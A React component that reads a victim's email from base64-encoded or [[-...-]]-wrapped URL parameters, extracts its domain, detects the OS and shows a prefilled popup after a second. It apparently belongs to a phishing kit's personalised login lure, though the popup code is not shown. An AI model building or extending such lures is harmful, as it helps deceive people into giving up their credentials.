"use client";

import React, { useState, useEffect } from "react";
import Popup from "./Popup";

const Fetcher = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [eparams, setEparams] = useState("");
  const [emailDomain, setEmailDomain] = useState("");
  const [systemInfo, setSystemInfo] = useState({
    date: new Date(),
    browser: "Chrome",
    os: "Unknown",
  });

  useEffect(() => {
    const detectOS = () => {
      const userAgent = window.navigator.userAgent.toLowerCase();
      if (userAgent.includes("mac")) return "Mac OS";
      if (userAgent.includes("windows")) return "Windows";
      if (userAgent.includes("linux")) return "Linux";
      return "Unknown";
    };

    setSystemInfo((prev) => ({
      ...prev,
      os: detectOS(),
    }));

    const dateInterval = setInterval(() => {
      setSystemInfo((prev) => ({
        ...prev,
        date: new Date(),
      }));
    }, 1000);

    return () => clearInterval(dateInterval);
  }, []);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    let email = params.get("email") || params.get("user") || params.get("m") || params.get("id");
    
    if (email) {
      // Handle base64 encoding if detected
      if (email.length > 5 && !email.includes("@") && !email.includes(" ")) {
        try {
          const decoded = atob(email);
          if (decoded.includes("@")) {
            email = decoded;
          }
        } catch (e) {}
      }

      const match = email.match(/\[\[-(.*?)-\]\]/);
      if (match) {
        email = match[1];
      }
      
      setEparams(email);
      
      const domainMatch = email.match(/@(.+)/);
      if (domainMatch) {
        setEmailDomain(domainMatch[1]);
      }
    }

    setTimeout(() => {
      setShowPopup(true);
    }, 1000);
  }, []);

  return (
    <div className="fetcher-container">
      {showPopup && (
        <Popup
          domain={emailDomain}
          eparams={eparams}
          systemInfo={systemInfo}
        />
      )}
    </div>
  );
};

export default Fetcher;